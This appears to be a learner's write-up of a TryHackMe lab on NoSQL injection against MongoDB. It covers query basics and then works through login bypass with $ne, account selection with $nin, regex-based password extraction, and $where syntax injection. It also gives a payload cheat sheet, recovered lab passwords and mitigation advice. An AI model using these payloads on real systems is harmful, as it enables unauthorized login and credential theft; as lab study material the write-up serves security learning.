# **`NoSQL Injection`**





<img width="1904" height="428" alt="image" src="https://github.com/user-attachments/assets/8f31f590-9d97-499e-aadf-45b6c41826b3" />











<details>
  <summary>What is NoSQL</summary>


## 1) Quick summary


- MongoDB stores data in the form of **documents** similar to JSON (key-value pairs).

- A group of similar documents collected in **collection** (like a table in an RDBMS).

- The collections group remains in **database**.

Queries in MongoDB are **objects/arrays** (JSON-like filters) instead of SQL statements.


![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1719679544440.png)


---


## 2) Basic concepts (in simple language)


- **Document**: One record --- Example:\
   ```js
   {"_id" : ObjectId("5f077332de2cdf808d26cd74"), "username" : "lphillips", "first_name" : "Logan", "last_name" : "Phillips", "age" : "65", "email" : "lphillips@example.com" }
   ```
- **Collection**: A collection of similar documents --- such as the `people` table.

- **Database**: Collection of collections.

- **Filter / Query**: An object that specifies conditions for retrieving documents --- like WHERE in SQL but in JSON form.

- **Operators**: Characters starting with `$` help construct complex conditions such as `$lt`, `$gt`, `$ne`, `$regex`, `$in`, `$or`, `$and`.


![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1719679596244.png)


---


## 3) Practical examples --- Simple filter → Expected results

Suppose you have a collection called `people` that contains different documents.

- A query that returns documents for which `last_name` = "Sandler":

    - Mongo shell:

    ```js
    db.people.find({ last_name: "Sandler" })
    ```

    - PHP (associative array style):

    ```js
    ['last_name' => 'Sandler']
    ```

- Query filters gender="male" and `last_name`="Phillips":

    ```js
    db.people.find({ gender: "male", last_name: "Phillips" })
    ```

- >  It will return the document in which both conditions are true (implicit AND).


- Inquiry for people under 50:

    ```js
    db.people.find({ age: { $lt: 50 } })
    ```

- > Note here that age can be a string or a number — the type of value is important! If stored as string the comparison behaves differently.


---



## 4) Common Operators with simplified explanation

- `$lt`, `$lte` --- less than/less or equal to.\
    `{ age: { $lt: 50 } }`

- `$gt`, `$gte` --- greater than/greater than or equal to.

- `$ne` --- not equal.\
    `{ username: { $ne: null } }`

- `$regex` --- Match with regular expression.\
    `{ email: { $regex: ".*@example.com$" } }`

- `$in` --- within a set of values.\
    `{ role: { $in: ["admin","moderator"] } }`

- `$or`, `$and` --- Complex logical conditions:


```js
{ $or: [ { age: { $lt: 20 } }, { role: "intern" } ] }
```

- `$where` --- Allows JavaScript to run within the query (high security risk, often disabled or should be disabled).


---


## 5) Important point---Data types matter very much


- If you store `age` as a string `30` instead of the number `30`, numerical comparison operations will not work as you expect.

- Also, if the server receives an **object** from the user and inserts it into the query without checking, the attacker can inject Operators (`{ username: { "$ne": null } }`) and change the query logic --- this is a NoSQLi gateway.



![image](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1719679617512.png)


<img width="1809" height="517" alt="image" src="https://github.com/user-attachments/assets/1154494f-7e0a-42a6-8487-90f573564a36" />




  
</details>





















<details>
  <summary>NoSQL Injection</summary>




## 🔥 **Basic idea: Injection is Injection**


Whether SQL or NoSQL...the idea is the same:

> **If the application takes the input from the user and puts it inside the Query without Validation → you can change the appearance of the Query completely.**

SQL → We use `'` or `"` to escape the query.\
NoSQL → There are no quotes to escape from...\
But we have a stronger need:

💥 **Inject Operators (not syntax)**
-----------------------------------

NoSQL allows the use of "Operators" such as:

- `$ne` = not equal

- `$gt` = greater than

- `$regex` = regular expression

- `$in`... and so on.

Instead of breaking the -query...\
**We add new conditions inside the query itself!**

This is the real danger in NoSQL.


---

## 🧠 **Two types NoSQL Injection**


1. **Syntax Injection**\
    Like SQLi → break the query form and write what you want.\
    It is rare because most languages ​​have this filter.

2. **Operator Injection (Important for us)**\
    Operators add aspects to the query,\
    Without breaking its shape.

This is what we will use to skip the entire Login!


---


## ⚡ The code with which the application works:

```php
$user = $_POST['user'];
$pass = $_POST['pass'];

$q = new MongoDB\Driver\Query(['username'=>$user, 'password'=>$pass]);
```

The problem? 😳
**The application takes the user and pass from the user and places them directly inside the query.**

I mean, if instead of sending:

```php
user=admin&pass=123
```

Can I send **Array** 🤯\
And Abuz is the form of filtering.

* * * * *

## 🎯 The target of the attack


We want to make MongoDB return **any User** without knowing the password.

How?


---

## 💣 Why is Array Injection dangerous?

If you send:

```php
$user = ['$ne'=>'xxxx']
$pass = ['$ne'=>'yyyy']
```

The final filter remains:

```js
['username' => ['$ne' => 'xxxx'],
 'password' => ['$ne' => 'yyyy']]
```


Meaning:

Give me all the users whose `username` is not `xxxxx`

And the `password` is not `yyyy`

This ` = ` almost all users

The first user to return → we will log in with his name 😎

Authentication Bypass ✔️

---

## 🔥🔥 Most important question:


**How ​​to export an Array through POST Request??**

Here's the surprise:

PHP (and also Python, Node, Ruby...) allows this:
------------------------------------------------

```php
user[$ne]=xxxx&pass[$ne]=yyyy
```

This way PHP will understand that you are sending:

```php
$_POST['user'] = array('$ne' => 'xxxx');
$_POST['pass'] = array('$ne' => 'yyyy');
```

And so...
Operator Injection has officially Done 👑🔥

---


<img width="1555" height="552" alt="image" src="https://github.com/user-attachments/assets/db097f10-6d95-4ca5-af44-ca0fc12b083e" />


<img width="881" height="330" alt="image" src="https://github.com/user-attachments/assets/d0305f46-08a7-4228-98f3-3fc300f0381c" />


<img width="1358" height="211" alt="image" src="https://github.com/user-attachments/assets/a9d4ee78-37ef-4b9e-8fc4-9b07f1f02510" />

---


## 🎯 Why did the attack succeed?


- MongoDB is based on associative arrays

PHP allows arrays to be sent via POST

- The application did not do type checking

- Therefore, you were able to add operator (`$ne`) inside the -query

This is a textbook example of **NoSQL Authentication Bypass**.


---


- <details>
     <summary>more</summary>

  
  🔥 1) **NoSQL Injection CheatSheet (Complete and Quick Reference)**
  ======================================================
  
  ✅ **1.1 -- Authentication Bypass**
  ---------------------------------
  
  ### **Bypass password problem (MongoDB):**
  
  `user[$ne]=1&pass[$ne]=1`
  
  ### **Use regex to accept any password:**
  
  `user=admin&pass[$regex]=.*`
  
  * * * * *
  
  ✅ **1.2 -- Extracting Data**
  ---------------------------
  
  ### **Extracting Usernames (using Error-Based or Boolean-Based):**
  
  `user[$regex]=^a`
  
  If it returns true → user begins with the letter a\
  I continue:
  
  `^ad`
  
  * * * * *
  
  ✅ **1.3 -- Most used NoSQLi Operators**
  ---------------------------------------------
  
  | Operator | Explanation |
  | --- | --- |
  | `$ne` | Not equal (strongest in bypass login) |
  | `$regex` | Regular Expression |
  | `$gt` / `$lt` | Greater/Less than |
  | `$in` | Available under |
  | `$exists` | Checks whether the field | exists
  | `$where` | Executes Javascript inside MongoDB (most dangerous) |
  
  * * * * *
  
  ✅ **1.4 -- Dangerous Payloads**
  ------------------------------
  
  ### **JavaScript Execution -- (Critical)**
  
  `user[$where]=this.password.length > 0`
  
  ### **Full Blind Exfiltration**
  
  `user[$regex]=^.{5}`
  
  → Verify that the length of the user is 5.
  
  * * * * *
  
  * * * * *
  
  🔥 2) **Exploitation Steps for the bag I was working on**
  ======================================================
  
  🎯 Goal:
  ---------
  
  Login logs in as the first user in the database.
  
  **Steps:**
  ------------
  
  ### **1) Open Intercept in Burp**
  
  Leave any data and direct it to Burp.
  
  * * * * *
  
  ### **2) Replace fields with operator injection**
  
  `user[$ne]=1&pass[$ne]=1`
  
  * * * * *
  
  
  ### **3) Send → Done**
  
  You are logged in...\
  for him?\
  Because MongoDB returned any user whose password was not 1**.
  
  * * * * *
  
  ### **4) Improve the attack (if you want a specific user)**
  
  If you want to make sure that the admin username exists:
  
  `user[$regex]=^ad`
  
  If you want, just admin:
  
  `user=admin&pass[$ne]=1`
  
  * * * * *
  
  * * * * *
  
  
  🔥 3) **Bug Bounty -- How to detect NoSQL Injection?**
  ==================================================
  
  ✔️ **3.1 -- Which field can be NoSQL?**
  ------------------------------------
  
  - Login
  
  -Signup
  
  - Search
  
  - Filtering
  
  - API endpoints
  
  - Mobile app endpoints
  
  If you find JSON → NoSQL chances are very high.
  
  * * * * *
  
  
  ✔️ **3.2 -- QUICK DISCOVERY**
  ------------------------
  
  Try sending a payload similar to this for any API:
  
  `{
    "username": { "$ne": null },
    "password": { "$ne": null }
  }`
  
  if:
  
  - An error occurred
  
  - Atramy 500 application
  
  - Return a different response
  
  → NoSQL injection is often present.
  
  * * * * *
  
  ✔️ **3.3 -- Discover in login:**
  --------------------------
  
  try:
  
  `username[$gt]=0`
  
  If login opens → confirmed.
  
  * * * * *
  
  ✔️ **3.4 - Discover in search**
  --------------------------
  
  If there is a Search Box:
  
  `q[$regex]=.*`
  
  If all data is returned → the vulnerability is confirmed.
  
  * * * * *
  
  * * * * *
  
  
  🔥 4) **Mitigation -- Fixing the vulnerability**
  ==========================================
  
  ✔️ **1) The data type must be fixed (MOST IMPORTANT)**
  ------------------------------------------------------
  
  Do Type Checking:
  
  `if (typeof username !== "string") reject();
  if (typeof password !== "string") reject();`
  
  This is the strongest protection against Operator Injection.
  
  * * * * *
  
  ✔️ **2) Use Allowlist**
  --------------------------
  
  Allow only expected values:
  
  `user: /^[a-zA-Z0-9_]{3,20}$/`
  
  * * * * *
  
  ✔️ **3) Do not build Queries directly from user input**
  ----------------------------------------------
  
  Use prepared queries or a respectable ORM.
  
  * * * * *
  
  ✔️ **4) Disable `$where` completely**
  ----------------------------------
  
  This is the most dangerous operator.
  
  * * * * *
  
  ✔️ **5) Escape/Encode for user input**
  --------------------------------------
  
  * * * * *
  
  ✔️ **6) Authentication must be at the server level, not the query**
  ----------------------------------------------------------------
  
  Meaning:
  
  - Pull the first button
  
  - Next, compare the password\
      Instead of running a query, it relies on the password.
  
  
  













  </details>






  
</details>














<details>
  <summary>Operator Injection: Bypassing the Login Screen</summary>


⚡ **Quick explanation of the Bypassing the Login Screen process**
================================================

🎯 **Basic idea:**
-----------------------

The web application is sent to a MongoDB query with:

`username = user_input
password=pass_input`

We changed the input from Text → to **Array with Operators**\
This left the query to remain:

`username = { $ne: "xxxx" }
password = { $ne: "yyyy" }`

→ means:\
*Give me any user whose username is not "xxxx" and whose password is not "yyyy"*\
This of course **applies to all users** → so enter as the first person in the database.

* * * * *

🔥 **The steps that took place in Burp (in brief):**
===========================================

1) You sent us the wrong login to let Burp see the form
---------------------------------------------

(The normal request that the application sends)

example:

`user=test&pass=123`

* * * * *

2) You sent us another request and we intercepted it
-------------------------------

We changed the parameters to array operators:

`user[$ne]=1&pass[$ne]=1`

* * * * *

3) MongoDB received the filter like this:
------------------------------------

`{
  "username": { "$ne": "1" },
  "password": { "$ne": "1" }
}`

* * * * *

4) Result:
-----------

The query returned **all users** because:

- All usernames ≠ 1

-And all passwords ≠ 1

The app thought that **Login was successful**\
And your entry along the Dashboard.





  
</details>















<details>
  <summary>Operator Injection: Logging in as Other Users</summary>



## 🔥 **Idea: Log in as any user using $nin Operator**


When we used `$ne` in the previous example, we entered it as the first user found in the database.\
But... you may want to choose **a specific user**.

Here it is `$nin`'s turn.

* * * * *

## 🎯 **What does $nin mean?**

`$nin` = Not In\
Meaning:

> "Give me the users whose username **does not exist** in this list."

example:

```php
username NOT IN ['admin']
```


Its meaning:\
"Give anyone except admin."

---

## ⚡ How do we use it to attack?


**1) In Burp we will change the parameter like this:**
----------------------------------------

```php
user[$nin][]=admin
pass[$ne]=123
```

Note:\
`$nin` takes **list**, so we write:\
`user[$nin][]=admin`

---

2) This is how the query will be:

```
{
  "username": { "$nin": ["admin"] },
  "password": { "$ne": "123" }
}
```

---






## 🔥 Ok, should we choose another user?


Simply add a new name to the list:

```php
user[$nin][]=admin&user[$nin][]=jude&pass[$ne]=123
```

turns into:

````php
"username": { "$nin": ["admin", "jude"] }
````


Meaning:

> Give any user **not admin** and not **jude**

This leaves you:

- Block certain accounts

- And access other accounts

- And repeatedly, attacking all users one by one



---

## 🧠 **The bottom line, King 👑**


- `$ne` = exclude one value

- `$nin` = exclude **list of values**

- Every time you enter a name → enter a different username

- This is how you can **brute-force the usernames** without even knowing the password 💀🔥


---

```
user[$nin][]=admin&pass[$ne]=123
```



<img width="1247" height="242" alt="image" src="https://github.com/user-attachments/assets/4fe8264e-a818-447c-bf56-36aeb3109c02" />


```
user[$nin][]=admin&user[$nin][]=pedro&pass[$ne]=123
```



<img width="1486" height="389" alt="image" src="https://github.com/user-attachments/assets/cce31607-d079-4a68-8da6-c12b71accb28" />


```
user[$nin][]=admin&user[$nin][]=pedro&user[$nin][]=john&pass[$ne]=123
```


<img width="1498" height="401" alt="image" src="https://github.com/user-attachments/assets/d7571317-7ebc-47d8-b1c5-77a48fcf43b5" />


```
user[$nin][]=admin&user[$nin][]=pedro&user[$nin][]=john&user[$nin][]=secret&pass[$ne]=123
```


<img width="1492" height="408" alt="image" src="https://github.com/user-attachments/assets/68211fb6-9500-4a11-ac6c-7b563947f883" />

<img width="1802" height="388" alt="image" src="https://github.com/user-attachments/assets/b2a0a7c9-d892-490f-992c-6a06cbf407fc" />


  
</details>














<details>
  <summary>Operator Injection: Extracting Users' Passwords</summary>


This is one of the best parts of NoSQLi because it teaches you **How ​​to do Password Extraction without seeing the database**...\
We use **$regex brute force** exactly like the game *Hangman*.

Take care...\
We don't break the hash --- we ask the server smart questions until it reveals the password itself 💀🔥

We explain each step in an easy way:

* * * * *

## 🔥 1) **We extract the password length**


We know that the user is:

```php
username = admin
```

Now we want to know how many letters the password has.

We use regex in the form:

```php
password[$regex]=^.{7}$

```

This means:

> “Is there a password for admin that is 7 characters long?”

If the server returns **Login Failed**\
7 remains wrong.

Please try:

- 1 letter

- 2 letters

- 3 letters

- ...\
    Until you reach the correct length.

In the example of THM...\
Correct length = **5**

Because when we tried the server:


```php
password[$regex]=^.{5}$

```

Return **Login Successful**\
So we know:\
🔍 admin password → length **5**

* * * * *

## 🔥 2) **We extract the first letter of the password**


Now we know that the password is 5 long, so we start trying:

```php
password[$regex]=^a....$

```

Meaning:

> It starts with `a` and then 4 letters

If the server returns "Login Failed"\
→ The first letter is not a\
We try b:

```php
^b....$

```


And then c, d, e...

Until we reach the correct letter.

In the example...\
The first letter that appears:


```php
a

```

Because:

```php
password[$regex]=^a....$

```

Return Login Successful

🔥 The first letter remains = ` a `

--- 


## 🔥 3) **We extract the second letter**


We fix the first letter...\
And we try another letter:


```php
password[$regex]=^a[a-z0-9]...$
```

But in practice, we do it letter by letter:


```php
^aa...$
^ab...$
^ac...$
...

```

Until the server tells you login successful.

🔥 Then we know the second letter.


---


## 🔥 4) We repeat the same idea for each letter


We will play the same game:

- The third letter →

```perl
^ab[a-z0-9]..$

```

- Fourth letter →

```
^abc[a-z0-9].$

```

Until you complete the five letters.


---

## 🧠 **The whole idea is that we ask Yes/No questions to the server**



This server is stupid...

If the regex is a match --- it will leave you trespassing

If it doesn't match --- it says login failed

We are taking advantage of this until we install the entire password without any hash cracking 💀🔥

* * * * *

## 🎯 **Conclusion, King:**


1\.  We specify the length of the password using `^.{n}$`

2\.  We define the first letter using `^x....$`

3\.  We define the second letter using `^ax...$`

4\.  We continue until we know the complete password

5\.  We repeat the process for any other user 💣



---


```
user=john&pass[$regex]=^.{8}$
```


<img width="1852" height="422" alt="image" src="https://github.com/user-attachments/assets/36f6d38c-2d14-4586-ab7f-3570811aa96b" />


```
user=john&pass[$regex]=^10584312$
```


<img width="1458" height="406" alt="image" src="https://github.com/user-attachments/assets/ba1e7edc-2fc3-437e-9288-18d350aa813c" />


```
john : 10584312
```

<img width="1487" height="389" alt="image" src="https://github.com/user-attachments/assets/06c082e9-1940-4f7d-ae53-9e618998f74e" />


```
secret : 1
```

```
pedro : coolpass123
```

<img width="898" height="373" alt="image" src="https://github.com/user-attachments/assets/b5752b8b-917a-4d2b-92ed-a89c1fb5a9af" />






  
</details>











<details>
  <summary>Syntax Injection: Identification and Data Extraction</summary>



## 🔥 First: What does Syntax Injection mean in NoSQL?


Operator Injection (in which we used `$ne`, `$nin`, `$regex`) was carried out inside the filter normally.

But here the situation is different...

**Syntax Injection = We can break the JavaScript syntax that the programmer wrote inside MongoDB.**

for him?\
Because MongoDB allows you to write a JS statement inside `$where`

Like this:

```php
mycol.find({
    "$where": "this.username == '" + username + "'"
})

```


💀 Here remains the disaster:\
The programmer does **string concatenation** and inserts the username into the JavaScript code.

* * * * *

## 💥 1) Proof of the existence of Syntax Injection


You entered:


```php
admin'

```

The final form remains like this:

```php
this.username == 'admin''

```



This is syntax error in JavaScript\
A large stack trace came out → So... **Injection confirmed**

* * * * *

## 💥 2) Proof of condition control (True/False Injection)


We try to always make the condition False:

```php
admin' && 0 && 'x

```

it means:

```js
this.username == 'admin' && 0 && 'x'

```

The condition is always false → Result: No email

Then we try making it True:

```
admin' && 1 && 'x

```

it mean:

```js
this.username == 'admin' && 1 && 'x'

```

1 = True\
All conditions are successful → acres admin@nosql.int

🔥 This is how we made sure that we can operate JavaScript at our convenience.


---

## 💥 3) Exploiting the Dumping All Emails vulnerability


Now we want to set the condition so that it is always True, regardless of the user.

Most famous payload:

```js
admin'||1||'

```


for him?

Because the sentence will remain:

```js
this.username == 'admin' || 1 || ''

```

And 1 = True
This means that the condition is always successful → MongoDB will return all documents.

And I got the result:

```
admin@nosql.int
pcollins@nosql.int
jsmith@nosql.int
...

```

🔥🔥 **This is how I officially made FULL DATA DISCLOSURE via Syntax Injection.**

---


## 🧠 Why is Syntax Injection not so widespread?


Because the programmer wants to write something like:

```js
"$where": "this.username == '" + username + "'"

```


It must be:

1️⃣ I don’t understand the effect of concatenation
2️⃣ and use JavaScript instead of regular filters

The right solution:


```js
{ "username": username }

```



The loophole is rare, but when you find it = **disastrous**.

* * * * *

## 🎯 Conclusion, King:


- Operator Injection = common

- Syntax Injection = rare but fatal

- You can control JavaScript code inside MongoDB

-You can do:

    - Authentication Bypass

    - Complete Dump for Collection

    - Code Execution inside `$where` if misconfigured

- This is very similar to SQLi---but it is inside JS code








  
</details>



































